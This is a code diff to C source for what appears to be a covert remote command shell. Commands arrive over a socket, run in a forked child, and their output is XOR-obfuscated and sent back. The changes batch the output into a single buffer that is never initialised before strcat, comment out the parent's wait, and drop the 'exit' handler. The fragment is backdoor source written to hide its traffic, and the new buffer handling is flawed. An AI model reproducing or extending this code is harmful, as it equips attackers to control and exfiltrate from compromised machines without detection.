@@ -57,7 +57,7 @@ int main(void)
 				if((child_pid = fork()) == 0)
 				{
 					char shell_msg[50];
-					snprintf(shell_msg, 50, "\nExecuting command on PID %i\n", getpid());
+					snprintf(shell_msg, 50, "\n[+] Executing command on PID %i\n\n", getpid());
 					char* xorshellmsg = XOR(shell_msg, key, strlen(shell_msg), keylen);
 					write(sock, xorshellmsg, strlen(shell_msg));
 
@@ -70,23 +70,25 @@ int main(void)
 					    
 					}
 					char path[2050];
+					char command[12000];
 					while (fgets(path, sizeof(path), fp) != NULL) {
-					    					     
-					    char* xordata = XOR(path, key, strlen(path), keylen);
-					    write(sock, xordata, strlen(path));
+					    strcat(command, path);
 					}
+					char* xordata = XOR(command, key, strlen(command), keylen);
+					write(sock, xordata, strlen(command));
+					free(xordata);
 					
 					exit(EXIT_SUCCESS);
 				}
 				// Make the parent process wait for child process to terminate
-				while ((wpid = wait(&status)) > 0);
+		//		while ((wpid = wait(&status)) > 0);
 
 			}
-			else if(strncmp(buf, "exit\n", 5) == 0)
+			else if(strncmp(xorbuf, "\n", 1) == 0)
 			{
-				char* xorexit = XOR(MSG_EXIT_CMD, key, strlen(MSG_EXIT_CMD), keylen);
-				write(sock, xorexit, strlen(MSG_EXIT_CMD));
-				exit(EXIT_SUCCESS);
+				char* xornewline = XOR("\n", key, 1, keylen);
+				write(sock, xornewline, 1);
+		
 			}
 
 			else
